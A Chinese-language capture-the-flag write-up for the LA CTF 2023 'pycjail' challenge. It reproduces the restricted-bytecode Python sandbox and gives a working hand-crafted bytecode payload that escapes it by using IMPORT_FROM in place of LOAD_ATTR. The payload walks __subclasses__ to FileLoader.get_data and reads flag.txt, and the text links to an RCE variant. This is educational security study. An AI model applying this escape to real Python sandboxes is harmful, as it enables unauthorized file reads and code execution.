# Pycjail

[题目](https://github.com/uclaacm/lactf-archive/tree/main/2023/misc/pycjail)

继续总结看到的[wp](https://justinapplegate.me/2023/lactf-pycjail/)。

```python
#!/usr/local/bin/python3
import opcode
import inspect


def f():
    pass


banned = ["IMPORT_NAME", "MAKE_FUNCTION"]
for k in opcode.opmap:
    if (
        ("LOAD" in k and k != "LOAD_CONST")
        or "STORE" in k
        or "DELETE" in k
        or "JUMP" in k
    ):
        banned.append(k)
banned = {opcode.opmap[x] for x in banned}

consts = tuple(input("consts: ").split(","))
names = tuple(input("names: ").split(","))
code = bytes.fromhex(input("code: "))
if len(consts) > 3:
    print("too many consts >:(")
elif len(names) > 4:
    print("too many names >:(")
elif len(code) > 30:#一个opcode的byte长2，这里就是最多15个opcode
    print("too much code >:(")
elif len(code) % 2 != 0:
    print("invalid code >:(")
elif any(code[i] in banned for i in range(0, len(code), 2)):#code的格式为opcode 值 code 值...，因此跳着取，这里过滤opcode
    print("banned opcode >:(")
elif any(code[i] > 3 for i in range(1, len(code), 2)):#这里要求opcode的值不能大于3
    print("I never learned how to count past 3 >:(")
else:
    f.__code__ = f.__code__.replace( #https://www.codeguage.com/courses/python/functions-code-objects
        co_stacksize=10, #f()本来是空函数，这里将其替换为我们输入的代码，下方p(r(f()))即可运行
        co_consts=consts,
        co_names=names,
        co_code=code,
    )
    print("here goes!")
    frame = inspect.currentframe()
    p = print
    r = repr
    for k in list(frame.f_globals): #https://docs.python.org/3/library/inspect.html
        if k not in ("p", "r", "f"):
            del frame.f_globals[k]
    p(r(f()))
```

分析题目，我们可以输入code，程序运行后输出结果。问题在于过滤得有点多，import/makefunc/load/store/delete/jump等操作全没了。第一种解法尝试读取flag文件，等会我再放第二种直接RCE的解法。根据[文档](https://docs.python.org/3.10/library/dis.html)内容，发现CALL_FUNCTION和CALL_METHOD未被过滤，两者都可调用函数。然而，假如栈上没有可调用对象，这俩玩意是没用的。LOAD_GLOBAL, LOAD_NAME, LOAD_METHOD和LOAD_ATTR是常用的加载可调用对象的opcode，可惜它们全在黑名单里。整个LOAD家族只剩下个LOAD_CONST，可它又只能往栈上加载字符串。

准备死磕，需要个测试脚本。

```python
import dis

code_str = 'print("a")'
code = compile(code_str, '<string>', 'exec') #https://docs.python.org/3/library/functions.html#compile

dis.dis(code)

print("\nconsts: ", code.co_consts)
print("names: ", code.co_names)
print("code: ", code.co_code.hex())
```

另一个比赛的另一个[题目wp](https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak)给了作者启发：IMPORT_FROM本质上还是LOAD_ATTR，只不过多了一层伪装。正常情况下的IMPORT_FROM后面总是跟着IMPORT_NAME，而IMPORT_NAME又被过滤了，让人不会把太多心思放在IMPORT_FROM上。如果我们能把IMPORT_FROM当LOAD_ATTR用，往栈上放可调用对象就很简单了。

在python 的bytecode中，两种调用函数的方式分别为LOAD_METHOD+CALL_METHOD和LOAD_ATTR+CALL_FUNCTION。这里我们用IMPORT_FROM代替LOAD_ATTR，也能正常使用。一个问题解决，第二个问题是怎么获取数字？一般的payload都是靠`"".__class__.__base__.__subclasses__[某个数字]`来获取想要的模块，可是题目使用input函数获取payload，我们输入的任何内容都是字符串。巧的是，正好有个GET_LEN opcode，作用是对栈顶元素调用len函数。那就好办了，因为`"".__class__`等同于`"任意长度字符串".__class__`，所以我们在const里放上这个字符串，要用数字时就使用LOAD_CONST把字符串加载上来，调用GET_LEN获取长度就是想要的数字了。不过GET_LEN把数字结果放到栈顶后，仍然会保留之前那个字符串。因此还要用另外两个opcode把字符串pop出去。（这里我不太确定是最后的for循环把字符串过滤了还是想缩小栈的大小，不让其超过co_stacksize。最后的for循环似乎是把除p，r，k外的命名空间删掉，我也不太确定。在最终payload里删除了ROT_TWO和POP_TOP的bytecode。运行结果在f函数里出现string index out of range。可能不是过滤的问题，是运行的问题？）。

目前我们有了下面的payload：

```
Python code: 'aaaa...aaa'.__class__.__base__.__subclasses__()[14]

consts: aaaa...aaa
names: __class__,__base__,__subclasses__
code: 64006d006d016d02830064001e000200010019005300
#code是手工修改过的

Disassembly:
6400 -> LOAD_CONST, consts[0] -> 'aaaa...aaa'
6d00 -> IMPORT_FROM, names[0] -> __class__
6d01 -> IMPORT_FROM, names[1] -> __base__
6d02 -> IMPORT_FROM, names[2] -> __subclasses__
8300 -> CALL_FUNCTION
6400 -> LOAD_CONST, consts[0] -> 'aaaa...aaa'
1e00 -> GET_LEN -> 14 or whatever we want
0200 -> ROT_TWO
0100 -> POP_TOP
1900 -> BINARY_SUBSCR
5300 -> RETURN_VALUE
```

还剩下2 consts, 1 name和4 opcodes给我们完成剩余payload。翻阅[可用类列表](https://justinapplegate.me/static/lactf-pycjail/classes.txt)，我们可以一个一个试哪个类符合条件。`"".__class__.__base__.__subclasses__()[144]()._module.__builtins__["eval"]("代码")`需要两个name,不行。最后找到了`<class '_frozen_importlib_external.FileLoader'>`，里面有个get_data()函数，可以获取flag文件内容。（发现[这里](https://www.cnblogs.com/h0cksr/p/16189741.html)写了）。`("a"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`正是符合要求的payload。

```
''.__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')

consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt
names: __class__,__base__,__subclasses__,get_data
code: 64006d006d016d02830064001e000200010019006d036401640183025300

6400 -> LOAD_CONST, consts[0] -> 'a'
6d00 -> IMPORT_FROM, names[0] -> __class__
6d01 -> IMPORT_FROM, names[1] -> __base__
6d02 -> IMPORT_FROM, names[2] -> __subclasses__
8300 -> CALL_FUNCTION
6400 -> LOAD_CONST, consts[0] -> 'a'
1e00 -> GET_LEN -> 1
0200 -> ROT_TWO
0100 -> POP_TOP
1900 -> BINARY_SUBSCR
6d03 -> IMPORT_FROM, names[3] -> get_data
6401 -> LOAD_CONST, consts[1] -> 'flag.txt'
6401 -> LOAD_CONST, consts[1] -> 'flag.txt'
8302 -> CALL_FUNCTION
5300 -> RETURN_VALUE
```

[RCE解法](https://gist.github.com/lebr0nli/7295bd3cd39573ca9625bb9285555c44)。感觉重点还是IMPORT_FROM那个知识点，只不过这个解法尝试从builtins中获取os模块getshell。

## Flag
> flag{maybe_i_should_only_allow_nops_next_time}